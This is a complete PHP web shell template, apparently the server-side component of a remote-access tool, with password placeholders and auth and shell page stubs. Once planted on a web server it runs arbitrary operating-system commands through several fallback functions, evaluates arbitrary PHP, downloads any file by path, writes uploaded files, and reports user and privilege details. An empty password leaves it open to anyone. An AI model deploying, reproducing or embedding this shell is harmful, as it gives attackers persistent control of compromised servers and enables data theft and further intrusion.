<?php
$password = "{password}";
define("password", $password);

function success($data)
{
    respond(200, array_merge($data, array("cwd" => getcwd())));
}

function error($msg, $dat = "")
{
    respond(400, array("errmsg" => $msg, "dat" => $dat));
}

function respond($rc, $data)
{
    http_response_code($rc);
    $out = "KJB_" . $GLOBALS["delimiter"] . "_BEGIN " . base64_encode(json_encode(utf8_encode_obj($data))) . " KJB_" . $GLOBALS["delimiter"] . "_END";
    try {
        header('Content-Type: text/plain; charset=UTF-8');
        header('Content-Length: ' . strlen($out));
    } catch (Exception $e) {
        // ignore
    }
    echo $out;
    exit(0);
}


function is_authenticated()
{
    return isset($_COOKIE["auth"]) && $_COOKIE["auth"] === password || password === "";
}

if ($_SERVER["REQUEST_METHOD"] === "GET") {
    if (isset($_GET["download"])) {

        // handle download call
        function handle_download($file)
        {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            flush();
            readfile($file);
            flush();
            exit;
        }

        handle_download($_GET["download"]);
        exit(0);
    }
}

// handle api calls
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    function run($password)
    {
        $_POST = json_decode(file_get_contents('php://input'), true);
        if (!isset($_POST["req"])) {
            error("No data supplied.");
        }


        $data = $_POST["req"];
        $GLOBALS["delimiter"] = $data["delimiter"];

        if (($password === "" || isset($data["auth"]) && $data["auth"] === $password) && !is_authenticated()) {
            $_SESSION["auth"] = true;
            success_msg("Authenticated");
        }

        if (!is_authenticated()) {
            error("Please authenticate");
        }


//Authenticated zone
        $command = $data["cmd"];
        if (!isset($command)) {
            error("Unknown command.");
        }

        $cmdData = $data["body"];
        $cwd = $data["cwd"];
        if (isset($cwd) && $cwd !== "") {
            chdir($cwd);
        }

        try {
            handle($command, $cmdData);
        } catch (Exception $e) {
            error("Exception happened", array("excpmsg" => ($e->getMessage())));
        }
    }

    function handle($command, $data)
    {
        switch ($command) {
            case "info":
                handle_info();
                break;
            case "exec":
                handle_exec($data);
                break;
            case "eval":
                handle_eval($data);
                break;
            case "cd":
                handle_cd($data);
                break;
            case "check_downloadable":
                handle_check_downloadable($data);
                break;
            case "upload":
                handle_upload($data);
        }
    }

    function windows_summary()
    {
        $is_admin_check = "net session 1>NUL 2>NUL || echo false";
        $is_admin_res = exec_cmd($is_admin_check);

        return array(
            "username" => exec_cmd("whoami"),
            "isSuperUser" => $is_admin_res[0] !== "false"
        );
    }

    function linux_summary()
    {
        $is_root_res = exec_cmd("whoami");
        return array(
            "username" => $is_root_res,
            "isSuperUser" => $is_root_res[0] === "root"
        );
    }

    function is_windows()
    {
        return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    }

    function handle_info()
    {
        $res = array(
            "os" => php_uname("s"),
            "hostname" => php_uname("n"),
            "release" => php_uname("r"),
            "version" => php_uname("v"),
            "machine" => php_uname("m"),
            "all" => php_uname("a"),
            "writeable" => is_writeable(getcwd())
        );

        if (is_windows()) {
            $res = array_merge($res, windows_summary());
        } else {
            $res = array_merge($res, linux_summary());
        }

        success($res);
    }

    function handle_eval($data)
    {
        $res = eval($data["payload"]);
        success(array("result" => $res));
    }

    function handle_cd($data)
    {
        chdir($data["path"]);
        success(array());
    }

    function exec_cmd($cmd)
    {
        try {
            if (function_exists("exec")) {
                exec($cmd, $output);
                $output = implode($output, "\n");
            } else if (function_exists("shell_exec")) {
                $output = shell_exec($cmd);
            } else if (function_exists("system")) {
                ob_start();
                system($cmd);
                $output = ob_get_contents();
                ob_end_clean();
            } else if (function_exists("passthru")) {
                ob_start();
                passthru($cmd);
                $output = ob_get_contents();
                ob_end_clean();
            } else {
                error("Command execution not possible, all functions disabled.");
                return null;
            }
        } catch (Exception $e) {
            return null;
        }

        return $output;
    }

    function handle_exec($data)
    {
        $input = $data["payload"];
        $output = exec_cmd($input);
        if (is_null($output)) {
            error("Exception happened");
        }

        if ($output === "") {
            error("KJB NORESP");
        }

        success(array("output" => explode("\n", utf8_encode_obj($output))));
    }

    function utf8_encode_obj($obj)
    {
        if (!function_exists("utf8_encode")) {
            return $obj;
        }
        if (is_array($obj)) {
            foreach ($obj as $key => $value) {
                $obj[$key] = utf8_encode_obj($value);
            }
        } else if (is_string($obj)) {
            return utf8_encode($obj);
        }
        return $obj;
    }

    function handle_upload($data)
    {

        $filePath = $data["path"];
        $content = $data["content"];

        $handle = @fopen($filePath, "wb");
        if ($handle === false) {
            error("File could not be uploaded.");
        } else {
            fwrite($handle, base64_decode($content));
            fclose($handle);
            success(array("success" => true, "path" => $filePath));
        }
    }

    function handle_check_downloadable($data)
    {
        success(array("exists" => file_exists($data["file"]), "is_readable" => is_readable($data["file"])));
    }


    function success_msg($msg)
    {
        success(array("succmsg" => $msg));
    }

    run($password);
    exit(0);
}
?>

<?php if (!is_authenticated()) { ?>
    <!-- {auth.php} -->
<?php } else { ?>
    <!-- {shell.php} -->
<?php } ?>
